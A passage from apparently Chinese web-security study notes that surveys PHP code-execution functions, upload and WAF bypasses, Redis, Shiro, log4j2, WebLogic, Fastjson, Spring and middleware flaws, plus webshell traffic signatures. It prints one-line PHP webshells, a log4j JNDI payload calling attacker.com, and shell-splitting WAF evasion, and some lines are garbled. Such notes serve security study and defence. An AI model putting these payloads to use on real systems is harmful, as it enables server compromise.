+<p>使用开发语言提供的禁用外部实体的办法</p>
+<p>通过黑名单过滤用户提交的xml数据</p>
+<p>不允许xml中含有任何自己声明的DTD</p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP: system(), exec() , shell_exec(), passthru(), pcntl_exec(), popen()</span><br><span class="line"></span><br><span class="line">JAVA: java.lang.Runtime.getRuntime(.exec(command)</span><br><span class="line"></span><br><span class="line">Python: system(), popen(), subprocess.call(), spawn</span><br></pre></td></tr></table></figure>
+
+<h3 id="代码执行，文件读取，命令执行的函数都有哪些"><a href="#代码执行，文件读取，命令执行的函数都有哪些" class="headerlink" title="代码执行，文件读取，命令执行的函数都有哪些"></a>代码执行，文件读取，命令执行的函数都有哪些</h3><p>1)代码执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function</span><br></pre></td></tr></table></figure>
+
+<p>2)文件读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(),highlight_file(),fopen(),readfile(),fread(),fgetss(),fg ets(),parse_i n i_fil e(),show_sou rce(),file()</span><br></pre></td></tr></table></figure>
+
+<p>3)命令执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System（）, exec(), shellexecQ, passthruQ ,pcntl_exec(), popen(),proc_open()</span><br></pre></td></tr></table></figure>
+
+<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>eval()：把输入参数作为PHP代码执行，如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意：eval() 函数传入的参数必须为PHP代码，即要以分号结尾。eval()函数是非常危险的， 因为</p>
+<p>它允许执行任意 PHP 代码。</p>
+<p>**assert()**：检查一个断言是否为 FALSE，如果参数是字符串，将会被 assert() 当做PHP 代码来执</p>
+<p>行，如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">assert</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意：assert()函数是直接讲传入的参数当成PHP</p>
+<p>代码执行，不需要以分号结尾。而且，php版本&lt;7时，assert被拼接之后依然可以执行代码，但</p>
+<p>eval不行。</p>
+<p>**preg_replace()**，执行一个正则表达式的搜索和替换，参数格式为preg_replace(‘正则规则’,’替换字</p>
+<p>符串’，’目标字符’)，如： preg_replace(‘&#x2F;input&#x2F;e’,$_GET[‘cmd’],’hello input’) 。修饰符</p>
+<p>e ：首先对替换字符串执行eval()函数，使用执行结果作为实际参与替换的字符串。</p>
+<p>**call_user_func()**，第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数，如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>()、<span class="keyword">include_once</span>()、<span class="keyword">require</span>() <span class="keyword">require_once</span>()</span><br></pre></td></tr></table></figure>
+
+<p>远程文件包含：</p>
+<p><strong>allow_url_fopen&#x3D;On</strong>（默认开启）并且allow_url_include&#x3D;On（默认关闭）</p>
+<p>可在\phpstudy\PHPTutorial\php\php-5.2.17\php.ini 中配置</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="文件上传功能的检测点有哪些？"><a href="#文件上传功能的检测点有哪些？" class="headerlink" title="文件上传功能的检测点有哪些？"></a>文件上传功能的检测点有哪些？</h3><p>客户端的JS检测（主要检测文件名后缀）</p>
+<p>服务端检测（MINE类型检测、文件后缀名、文件格式头）</p>
+<h3 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h3><p>一般在 F12 源代码中可以看到，校验的是文件后缀名。</p>
+<h3 id="服务端校验："><a href="#服务端校验：" class="headerlink" title="服务端校验："></a>服务端校验：</h3><ul>
+<li><input disabled="" type="checkbox"> 1）文件头 content-type 字段校验（image&#x2F;jpeg）</li>
+<li><input disabled="" type="checkbox"> 2）文件内容头的校验。</li>
+<li><input disabled="" type="checkbox"> 3）后缀名黑名单校验。</li>
+<li><input disabled="" type="checkbox"> 4）后缀名白名单校验。</li>
+<li><input disabled="" type="checkbox"> 5）自定义正则校验。</li>
+</ul>
+<p>waf设备检测</p>
+<p>文件上传校验的绕过</p>
+<p>客户端绕过</p>
+<p>前端会检测后缀，可以先上传一个符合后缀的文件，再用 burp 抓包修改文件的内容以及后缀即可。</p>
+<h3 id="服务端绕过"><a href="#服务端绕过" class="headerlink" title="服务端绕过"></a>服务端绕过</h3><ul>
+<li><input disabled="" type="checkbox"> 1）文件类型绕过</li>
+<li><input disabled="" type="checkbox"> 用 burp 抓包，修改 content-type 字段为 image&#x2F;jpeg 。</li>
+<li><input disabled="" type="checkbox"> 2）文件头绕过</li>
+<li><input disabled="" type="checkbox"> 在正常的一句话木马前面加上一些文件信息。 如 gif 的文件幻数：</li>
+<li><input disabled="" type="checkbox"> 3）文件后缀名绕过</li>
+<li><input disabled="" type="checkbox"> 服务端会对文件后缀进行黑名单校验。</li>
+<li><input disabled="" type="checkbox"> 则找黑名单扩展名的漏网之鱼：</li>
+<li><input disabled="" type="checkbox"> 4）配合操作系统文件命令规则</li>
+<li><input disabled="" type="checkbox"> 上传不符合 Windows 文件命名规则的文件名</li>
+<li><input disabled="" type="checkbox"> 5）配合其他规则</li>
+<li><input disabled="" type="checkbox"> 0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候。test.php(0x00).jpg、test.php%00.jpg。</li>
+<li><input disabled="" type="checkbox"> 例如： 路径&#x2F;upload&#x2F;1.php(0x00)，文件名1.jpg，结合&#x2F;upload&#x2F;1.php(0x00)&#x2F;1.jpg</li>
+<li><input disabled="" type="checkbox"> 6）配合文件包含漏洞</li>
+<li><input disabled="" type="checkbox"> 前提：校验规则只校验当文件后缀名为 asp&#x2F;php&#x2F;jsp 的文件内容是否为木马。 先上传一个内容为一句话木马的 .txt 文件，后缀正常未被检测并且上传成功；</li>
+<li><input disabled="" type="checkbox"> 再上传一个 .php 文件，内容为 <?php Include("刚刚上传的 .txt 文件路径"); ?></li>
+<li><input disabled="" type="checkbox"> 此时，这个 php 文件就会去引用 txt 文件的内容，从而绕过校验。</li>
+</ul>
+<h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h3><ul>
+<li><p><input disabled="" type="checkbox"> 
+只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+严格判断文件类型</p>
+<p>在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+使用随机数修改文件名和文件路径</p>
+<p>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+单独设置文件服务器的域名</p>
+<p>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。 </p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+内容检测</p>
+<p>有效防范图片马和文件二次渲染</p>
+</li>
+</ul>
+<p>安全加固中间件</p>
+<p>及时更新并加固中间件，可以有效避免因为中间件的漏洞而导致的文件上传漏洞，比如某些中间件以前的版本很多都具有文件解析漏洞</p>
+<p>采用WAF等安全防护设备 </p>
+<p>采用WAF等安全防护设备可以有效的防御常见漏洞</p>
+<h2 id="过waf"><a href="#过waf" class="headerlink" title="过waf"></a>过waf</h2><h3 id="一-检测文件扩展名"><a href="#一-检测文件扩展名" class="headerlink" title="一. 检测文件扩展名"></a>一. 检测文件扩展名</h3><p>\1. 寻找黑名单之外的扩展名</p>
+<p>比如aspx被拦截，来个ashx就行了；jsp被拦截可以试试jspx、JSp等等。这个简单，无需赘述。</p>
+<p>\2. 构造畸形的数据包，“打乱”waf的检测</p>
+<p>这个方法，又能细分出很多来，而且屡试不爽，这里总结下我个人常用的</p>
+<p>(1) 删掉content-type</p>
+<p>(2) 构造多个filename</p>
+<p>(3) 把filename参数变畸形二. 检测文件内容</p>
+<p>一般来说，waf也会检测文件内容。这个时候被检测往往是一些敏感的“关键词”，比如exec()、eval()这些函数。这个时候怎么办呢？</p>
+<h3 id="二-检测文件内容"><a href="#二-检测文件内容" class="headerlink" title="二. 检测文件内容"></a>二. 检测文件内容</h3><p>\1. 图片马</p>
+<p>“上古时期”经常用这个绕waf什么的，现在估计不太行了。</p>
+<p>\2. 文件包含</p>
+<p>利用php远程文件包含或者java反射调用外部jar等等操作。可是有时候连带有文件包含功能的函数也会被检测。。。</p>
+<p>\3. 替换被检测的内容</p>
+<p>这个是我用得比较多的方法。</p>
+<p>比如java中Runtime.getRuntime().exec()经常被杀或者被拦截，这里可以通过调用ProcessBuilder类来实现相同的功能。fileOutputStream被拦截时  我可以用RandomAccessFile来替代</p>
+<p>\4. “曲线救国”</p>
+<p>当我们没办法直接上传shell的时候，可以先上传一些小功能的脚本，比如写文件，cmdshell等等：</p>
+<p>然后利用写文件或者cmdshell来写入shell，来达到我们的目的。</p>
+<p>比如windows cmd下不换行输入来拆分eval：</p>
+<p>又比如利用之前我们上传的写文件函数，一个字节一个字节的将shell写进去。</p>
+<p>先将我们的冰歇shell.jsp拆开：然后利用之前绕过waf上传的写文件脚本：结合burp的intruder把冰歇马给写进去：</p>
+<h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>未授权就是因为默认配置导致端口暴露到公网</p>
+<p>未授权是默认配置密码为空</p>
+<p>然后才能在未授权直接客户端可以连接</p>
+<p>然后使用config参数写shell</p>
+<h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><p>(1) 空密码并且允许外部直接连接</p>
+<p>(2) 使用 root 权限启动 redis</p>
+<p>(3) redis 在没有保护措施的情况下也没有修改默认端口</p>
+<p>默认端口是6379，很容易被扫到</p>
+<h3 id="攻击利用的机制"><a href="#攻击利用的机制" class="headerlink" title="攻击利用的机制"></a>攻击利用的机制</h3><p>redis的攻击主要是利用redis的持久化存储RDB或者AOF(默认不开启)，所谓持久化就是一种快照机制，用来后期恢复数据。比如RDB可以在一定的条件下将当前内存的数存储进一个dump.rdb文件中，如果下次想恢复这个数据的话，就需要将这个文件放在redis的快照保存目录下，替换当前的dump.rdb再次重启这样就能恢复原始的数据了</p>
+<p>Ssrf探测内网redis：REmote DIctionary Server(Redis) 是一个由 Salvatore Sanfilippo 写的 key-value 存储</p>
+<p>系统，是跨平台的非关系型数据库。Redis一般绑定在本地（不允许远程访问），默认不开启认证，默认</p>
+<p>端口为6379。如果在没有开启认证的情况下，可以导致任意用户利用ssrf漏洞攻击内网中的未授权Redis</p>
+<p>以及读取Redis的数据。使用 dict:&#x2F;&#x2F;127.0.0.1:6379 有返回信息，说明存在redis数据库：</p>
+<h2 id="Shior"><a href="#Shior" class="headerlink" title="Shior"></a>Shior</h2><p>1.2.4 key是写在源码里的，找到key就能构造攻击链，1.2.4之后的775key是随机生成的，但我们还可以构造cookie，尝试构造攻击链。</p>
+<p>Shiro流量特征:数据包含有多个$$$符号，C参数含有base64编码。cookie字段里的那个rememberme&#x3D;字段会特别长，长的离谱</p>
+<p>工具爆破判断：</p>
+<p>一般会进行爆破，成功没有deleteme字段</p>
+<p>爆破成功：比正常数据包大，Cookie RememberMe 字段的只作为猜测密钥的关键；当猜对时候，服务端响应中没有Set-cookie字段。“set-Cookie: rememberMe&#x3D;deleteMe:”</p>
+<p>是否成功要看密钥是否被爆破出来，爆破出来是没有deleteme这个字段的</p>
+<p>Apache Shiro</p>
+<p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中，同时存在默认的AES密钥，并且对反序列化结果未作过滤处理。这时，攻击者可以使用Shiro的默认密钥伪造用户Cookie，注入恶意命令，触发Java反序列化漏洞，进而在目标机器上执行任意命令。所以我们Payload产生的过程：命令-&gt;序列化-&gt;AES加密-&gt;base64编码-&gt;RememberMe Cookie值</p>
+<h3 id="550与721区别"><a href="#550与721区别" class="headerlink" title="550与721区别"></a>550与721区别</h3><p>Shiro-550，只需输入url，即可完成自动化检测和漏洞利用。Shiro-721，需输入url，提供一个有效的rememberMe Cookie，并指定目标操作系统类型。721的加密方式有缺陷可以被爆破出密钥，其他漏洞利用方式和550一致</p>
+<p>shiro721用到的加密方式是AES-CBC，而且其中的aes加密的key基本猜不到了，是系统随机生成的。而cookie解析过程跟550cookie的解析过程一样，也就意味着如果能伪造恶意的rememberMe字段的值且目标含有可利用的攻击链的话，还是能够进行RCE的。</p>
+<h3 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h3><p>Log4j就是java的日志插件，处理日志存在”KaTeX parse error: Expected ‘}’, got ‘EOF’ at end of input: …入，流量特点就是数据包里面有”{“字段。</p>
+<p>log4j 是 javaweb 的日志组件，用来记录 web 日志</p>
+<p>去指定下载文件的 url 在搜索框或者搜索的 url 里面，加上 ${jndi:ldap:&#x2F;&#x2F;127.0.0.1&#x2F;test} ，log4j 会对这串代码进行表达式解析，给 lookup 传递一个恶意的参数指定，参数指的是比如 ldap 不存在的资源 $ 是会被直接执行的。后面再去指定下载文件的 url，去下载我们的恶意文件。比如是 x.class 下载完成后，并且会执行代码块</p>
+<p>修复：升级 Log4j 到最新版本，根据业务判断是否关闭 lookup</p>
+<p>lookup相当于是一个接口，具体去哪里查找，怎么查找，就需要编写具体的模块去实现了，类似于面向对象编程中多态那意思。</p>
+<p>好在，log4j2已经帮我们把常见的查找途径都进行实现了：</p>
+<p>有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了</p>
+<p>有一个类似于字典的数据源，你可以通过LDAP协议，传一个name进去，就能获取到数据。</p>
+<p>JNDI可以远程下载class文件来构建对象如果远程下载的URL指向的是一个黑客的服务器，并且下载的class文件里面藏有恶意代码,造成JNDI注入攻击</p>
+<p><em><strong>*JNDI*</strong></em> <em><strong>*rmi*</strong></em></p>
+<ul>
+<li><input disabled="" type="checkbox"> <em><strong>*1.攻击者向漏洞服务器发起攻击请求。*</strong></em></li>
+<li><input disabled="" type="checkbox"> <em><strong>*（通过Log4j2记录攻击请求中，使用JNDI・LDAP加载恶意的代码${jndi:ldap:&#x2F;&#x2F;attacker.com&#x2F;a}。    （attacker.com是攻击者控制的服务））*</strong></em></li>
+<li><input disabled="" type="checkbox"> <em><strong>*2.服务器通过JNDI向attacker.com请求 ，此时，恶意类会被加载触发*</strong></em></li>
+<li><input disabled="" type="checkbox"> <em><strong>*（黑客在自己的服务器上，构造LDAP服务，返回一个构造的恶意类）*</strong></em> </li>
+<li><input disabled="" type="checkbox"> <em><strong>*3.attacker.com就可以在响应中添加一些、恶意的、可执的类，注入到服务器进程中。*</strong></em></li>
+<li><input disabled="" type="checkbox"> <em><strong>*（ 例如可执行的字节码<a target="_blank" rel="noopener" href="http://attacker.com/Exploit.class">http://attacker.com/Exploit.class</a> ）*</strong></em></li>
+<li><input disabled="" type="checkbox"> <em><strong>*被攻击的服务器：响应恶意类，恶意类在服务器端执行*</strong></em></li>
+<li><input disabled="" type="checkbox"> <em><strong>*●jndi:ldap*</strong></em></li>
+<li><input disabled="" type="checkbox"> 　  <em><strong>*log.error(“${jndi:ldap:&#x2F;&#x2F;attacker.com&#x2F;a}”);*</strong></em> </li>
+<li><input disabled="" type="checkbox"> <em><strong>*●jndi:rmi*</strong></em></li>
+<li><input disabled="" type="checkbox"> 　　<em><strong>*log.error(“${jndi:rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;xxxx}”);*</strong></em></li>
+</ul>
+<h2 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h2><p>反序列化、SSRF任意文件上传</p>
+<p>xml的反序列化漏洞，通过xmldecoder还是什么导致的xml解析代码执行。弱口令。</p>
+<p>流量特征:不加密，常见的出网协议也可以用。有很多T3协议的特征，文件操作和冰蝎一样有fileoutstream字段。</p>
+<p>网上爆出weblogic的WLS组件存在xmldecoder反序列化漏洞，直接post构造的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=xml&spm=1001.2101.3001.7020">xml</a>数据包即可rce。</p>
+<p>Weblogic T3协议反序列化(CVE-2018-2628)漏洞</p>
+<p>0x00 漏洞描述</p>
+<p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启. 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击。</p>
+<p>Weblogic(CVE-2019-2725)漏洞</p>
+<p>0x00 漏洞描述</p>
+<p>该漏洞存在于wls9-async组件，该组件为异步通讯服务，攻击者可以在&#x2F;_async&#x2F;AsyncResponseService路径下传入恶意的xml格式的数据，传入的数据在服务器端反序列化时，执行其中的恶意代码，实现远程命令执行，攻击者可以进而获得整台服务器的权限。</p>
+<h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h2><p>两种打法</p>
+<h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p>解析JSON的时候需要使用Feature才能触发 然后利用poc构建</p>
+<h3 id="第二种需要搭建环境-部署在tomcat环境"><a href="#第二种需要搭建环境-部署在tomcat环境" class="headerlink" title="第二种需要搭建环境 部署在tomcat环境"></a>第二种需要搭建环境 部署在tomcat环境</h3><p>原理也是jdni注入 利用就是构造一个json字符，用@type指定一个类库，流量特征就是json autotype</p>
+<p>漏洞利用fastjson autotype在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大影响</p>
+<p>fastjson的功能就是将json格式转换为类、字符串等供下一步代码的调用，或者将类、字符串等数据转换成json数据进行传输，有点类似序列化的操作</p>
+<table>
+<thead>
+<tr>
+<th>JSON.toJSONString(Object)</th>
+<th>将对象序列化成json格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JSON.toJSONString(Object,SerializerFeature.WriteClassName)</td>
+<td>将对象序列化成json格式，并且记录了对象所属的类的信息</td>
+</tr>
+<tr>
+<td>JSON.parse(Json)</td>
+<td>将json格式返回为对象(但是反序列化类对象没有@Type时会报错)</td>
+</tr>
+<tr>
+<td>JSON.parseObject(Json)</td>
+<td>返回对象是com.alibaba.fastjson.JSONObject类</td>
+</tr>
+<tr>
+<td>JSON.parseObject(Json, Object.class)</td>
+<td>返回对象会根据json中的@Type来决定</td>
+</tr>
+<tr>
+<td>JSON.parseObject(Json, User.class, Feature.SupportNonPublicField);</td>
+<td>会把Json数据对应的类中的私有成员也给还原</td>
+</tr>
+</tbody></table>
+<h2 id="Spring-rce"><a href="#Spring-rce" class="headerlink" title="Spring rce"></a>Spring rce</h2><p>\1. ClassLoader</p>
+<p>就是类加载器，ClassLoader的具体作用就是将class文件加载到jvm虚拟机中去，程序便可以运行</p>
+<p>\2. 漏洞利用的条件</p>
+<p>Web 应用程序是基于 Spring Framework 构建的（例如 Spring Boot）</p>
+<p>Web 应用程序在 JDK 9 或任何更高版本</p>
+<p>Web 应用程序使用数据绑定将请求参数绑定到 Java 对象</p>
+<p>\3. 漏洞利用的两个阶段</p>
+<p>2.1 覆盖 Tomcat 特定的ClassLoader属性，将访问日志文件路径更改为 web 根目录下的某个位置，并将日志模式（写入的数据）更改为包含 webshell 代码的常量模式。这会导致 JSP_webshell被放到web 根目录下</p>
+<p>2.2 向写入的 webshell发送查询请求，以执行任意 shell 命令</p>
+<p>4.参数绑定</p>
+<p>将URL中的的请求参数，进行类型转换（String或其他类型），将转换后的值在赋值给Controller方法形参中，然后Controller就可以直接使用该形参</p>
+<p>4.2 参数绑定简介</p>
+<p>这种机制从请求 URL 或请求正文中获取参数，并将它们分配给函数参数，或者在某些情况下分配给Java 对象</p>
+<p>4.3 潜在的危险</p>
+<p>将请求参数分配给 Java 对象时，存在一定的安全风险，因为构建对象的某些”内部”参数在外部可以控制，这包括Class、ClassLoader和ProtectionDomain参数</p>
+<p>4.4 Java9新特性</p>
+<p>从 Java 9 开始，由于引入了新的 API ( class.getModule )，可以绕过 Spring 的保护并直接为ClassLoader的属性分配任意值</p>
+<p>\5. 漏洞产生的关键点</p>
+<p>数据绑定将请求参数绑定到 Java 对象</p>
+<p>由于漏洞存在于 Spring 的数据绑定机制中，因此只有尝试将请求参数绑定到 POJO（Plain Old Java Objects）的 Web 应用程序易受攻击</p>
+<p><strong>SQLmap注入</strong>webshell</p>
+<p>Sqlmap  –os-shell</p>
+<p>1.select into outfile方法可用（允许导出文件）</p>
+<p>2.需要知道网站所在的绝对路径</p>
+<p>3.还要有足够的权限能够写入</p>
+<p>\4. root权限</p>
+<h2 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h2><h3 id="IIS-解析漏洞、短文件名枚举、远程代码执行、PUT漏洞"><a href="#IIS-解析漏洞、短文件名枚举、远程代码执行、PUT漏洞" class="headerlink" title="IIS:解析漏洞、短文件名枚举、远程代码执行、PUT漏洞"></a>IIS:解析漏洞、短文件名枚举、远程代码执行、PUT漏洞</h3><h4 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h4><p>ISS 6.x版本</p>
+<p>基于文件名</p>
+<p>该版本会默认把.asp;.jpg文件当成.asp文件来执行，原理是服务器默认不解析分号;后面的内容，相当于截断。</p>
+<p>基于文件夹名</p>
+<p> 该版本.asp可以作为文件夹名且会默认将.asp&#x2F;目录下的所有文件当成Asp文件解析。</p>
+<p>该版本配置默认将.asa，.cdx，.cer解析为asp</p>
+<p>ISS7.x版本</p>
+<p>在fast-cgi运行模式下，在任意文件例如1.jpg后面加上&#x2F;.php都会将该文件解析为php文件</p>
+<h4 id="PUT任意文件写入"><a href="#PUT任意文件写入" class="headerlink" title="PUT任意文件写入"></a>PUT任意文件写入</h4><p>在web服务扩展中开启WebDAV后，支持多种请求，配合写入权限可造成任意文件写入</p>
+<p>如何检测iis短文件名漏洞</p>
+<p>方法一：使用iis_shortname_Scan.py脚本进行检测</p>
+<p>用法：python IIS_shortname_Scan.py <a target="_blank" rel="noopener" href="http://www.target.com/">http://www.target.com/</a></p>
+<p>方法二： 使用 nmap, 命令为 nmap -p 80 –script http-iis-short-name-brute 192.168.0.1&#x2F;24</p>
+<p>Apache：解析漏洞、目录遍历、shiro反序列化漏洞</p>
+<h4 id="未知扩展名解析漏洞"><a href="#未知扩展名解析漏洞" class="headerlink" title="未知扩展名解析漏洞"></a>未知扩展名解析漏洞</h4><p> Apache对后缀名的解析是从右往左进行的，当遇到未知的后缀名时，会从右往左继续寻找，直到找到合法后缀名从解析，如a.php.xxx会以php文件进行执行。</p>
+<h4 id="AddHandler导致的解析漏洞"><a href="#AddHandler导致的解析漏洞" class="headerlink" title="AddHandler导致的解析漏洞"></a>AddHandler导致的解析漏洞</h4><p>当httpd-conf文件被添加</p>
+<p>AddHandler application&#x2F;x-httpd-php .php</p>
+<p> 这种情况下，只要文件名中包含.php的后缀，文件就会以php文件解析，.php可以不用是最后一个后缀，可利用这种特性构造文件名绕过上传白名单。</p>
+<h4 id="Httpd换行解析漏洞-影响版本：2-4-0-2-4-29"><a href="#Httpd换行解析漏洞-影响版本：2-4-0-2-4-29" class="headerlink" title="Httpd换行解析漏洞 影响版本：2.4.0-2.4.29"></a>Httpd换行解析漏洞 影响版本：2.4.0-2.4.29</h4><p>由于正则表达式不单匹配字符串的结尾位置，也可以匹配\n,\r，因此在解析php时，如1.php\x0A会被按php后缀解析，导致绕过一些服务器的安全策略。</p>
+<h3 id="Nginx：解析漏洞、目录遍历、CRLF注入、目录穿越"><a href="#Nginx：解析漏洞、目录遍历、CRLF注入、目录穿越" class="headerlink" title="Nginx：解析漏洞、目录遍历、CRLF注入、目录穿越"></a>Nginx：解析漏洞、目录遍历、CRLF注入、目录穿越</h3><p>任意解析漏洞：</p>
+<p> 小皮面板（8.1.0.4、8.1.0.7）默认配置下存在任意文件解析漏洞：上传图片马，在图片马地址后面加&#x2F;.php即可执行图片马。</p>
+<p>此漏洞为Nginx配置所导致，与Nginx版本无关。</p>
+<p>空字节任意代码执行漏洞：</p>
+<p>影响版本：0.5.*，0.6.*，0.7&lt;&#x3D;0.7.65,0.8&lt;&#x3D;0.8.37</p>
+<p>若目录下存在一个实际为php文件的a.jpg文件，可通过访问该文件，抓包，修改为a.jpg…php,在hex选项卡中将jpg后的.修改为00即可让文件依旧以php解析。该漏洞不受cgi.fix_pathinfo影响，当其为0时依旧解析。</p>
+<p>文件名逻辑漏洞</p>
+<p>影响版本：0.8.41-1.4.3&#x2F;1.5.0-1.5.7</p>
+<p>实现方法与上一个相类似，访问a.jpg，抓包修改为a.jpg…php，在hex选项卡中修改jpg后的两个点2e为20,00，即可以php文件解析，该漏洞不受cgi.fix_pathinfo影响，当其为0时依旧解析。</p>
+<h2 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h2><p>这是一项由于配置不当所导致的漏洞。</p>
+<p>Nginx文档有3个表示uri的变量：1.uri 2.document_uri 3.$request_uri</p>
+<p>1,2表示解码以后的请求路径，不带参数，3表示的是完整的URI（没有编码）</p>
+<p>Nginx会将1，2进行解码，导致传入%0a%0b即可引入换行符，导致CRLF注入漏洞</p>
+<h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>在配置Nginx别名时忘记加&#x2F;，导致访问..可穿越至上级目录。</p>
+<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>当配置文件中，autoindex值设置为on时，将产生目录遍历漏洞。</p>
+<p>Tomcat：示例目录、远程代码执行、反向路径遍历、war后门文件部署</p>
+<p>Tomcat任意文件写入（CVE-2017-12615）环境：Tomcat&#x2F;8.0.30</p>
+<p>当配置文件&#x2F;conf&#x2F;web.xml配置了可写（readonly&#x3D;false），即可往服务器写文件</p>
+<p>Apache Tomcat远程代码执行（CVE-2019-0232）影响范围：9.0.0.M1-9.0.17，8.5.0-8.5.39,7.0.0-7.0.93</p>
+<p>影响系统：windows</p>
+<p>启用了CGI Servlet（默认为关闭），enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭）</p>
+<p>由于JRE将命令行参数传递给Windows的方式存在错误，会导致CGI Servlet受到远程执行代码的攻击。</p>
+<p>Tomcat+弱口令&amp;&amp;后台getshell漏洞</p>
+<p>影响范围：Apache Tomcat 8</p>
+<p>Jboss：反序列化、war后门文件部署</p>
+<p>一些常见的关键字：member，java.util，java.lang等，同时payload信息里面存在大量16进制编码。可能会对“单引号”“双引号”“括号”“等号”进行相关编码操作。</p>
+<h2 id="webshell工具流量特征"><a href="#webshell工具流量特征" class="headerlink" title="webshell工具流量特征"></a>webshell工具流量特征</h2><h3 id="菜刀："><a href="#菜刀：" class="headerlink" title="菜刀："></a>菜刀：</h3><p>识别：</p>
+<p>(1)执行函数：@eval,@assert 等；</p>
+<p>(2)base64_decode(P O S T [ Z 0 ] ) , _POST[Z0]), </p>
+<p>POST[Z0]),_GET,$_REQUEST</p>
+<p>(3)截取参数z0,进行base64_decode后 ,</p>
+<p>@ini_set(“display_errors”,“0”);@set_time_limit(0);@set_magic_quotes_runtime(0)等</p>
